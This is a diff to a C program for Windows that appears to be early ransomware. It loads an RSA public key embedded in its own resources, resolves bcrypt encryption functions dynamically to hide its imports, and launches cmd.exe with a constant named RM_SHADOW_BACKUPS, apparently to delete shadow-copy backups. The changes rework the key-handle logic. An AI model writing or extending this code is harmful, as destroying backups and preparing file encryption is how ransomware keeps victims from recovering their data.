@@ -11,8 +11,8 @@ ftok(char *self, HINSTANCE *hinst)
 	FILE *f;
 	HRSRC rs;
 	HGLOBAL grs;
-	BCRYPT_ALG_HANDLE alghandle = 0;
-	BCRYPT_KEY_HANDLE hkey = 0;
+	BCRYPT_ALG_HANDLE alghandle;
+	BCRYPT_KEY_HANDLE hkey;
 	unsigned long pubkeysize;
 	char *pubkey;
 	/* Read the key size */
@@ -37,7 +37,10 @@ ftok(char *self, HINSTANCE *hinst)
 	/* BCryptImportKeyPair */
 	if (adrof(*hinst, "BCryptImportKeyPair")(alghandle, 0, BCRYPT_RSAPUBLIC_BLOB, &hkey, pubkey, pubkeysize, 0))
 		die("Failed to BCryptImportKeyPair");
-	return pubkey;
+	/* BCryptCloseAlgorithmProvider */
+	adrof(*hinst, "BCryptCloseAlgorithmProvider")(alghandle, 0);
+
+	return hkey;
 }
 
 int
@@ -59,8 +62,9 @@ main(int argc, char **argv)
 	HANDLE f;
 	HINSTANCE hinst;
 	FARPROC func_addr;
+	BCRYPT_KEY_HANDLE hkey;
 
-	char *rsa_pubkey = 0, *lib, *func;
+	char *lib, *func;
 	unsigned int pubkey_size;
 	/*
 	if ((rsa_pubkey = rsa_read_pubkey("TEST.txt")) < 0)
@@ -69,11 +73,13 @@ main(int argc, char **argv)
 	if (!(hinst = LoadLibrary("bcrypt.dll")))
 		die("Failed to load bcrypt.dll");
 
-	rsa_pubkey = ftok(argv[0], &hinst);
+	hkey = ftok(argv[0], &hinst);
 
 	ShellExecute(NULL, "open", "cmd.exe", RM_SHADOW_BACKUPS, NULL, SW_SHOW);
 
-	free(rsa_pubkey);
+	/* BCryptDestroyKey */
+	if (adrof(hinst, "BCryptDestroyKey")(hkey))
+		die("Failed to BCryptDestroyKey");
 	return 0;
 }
 
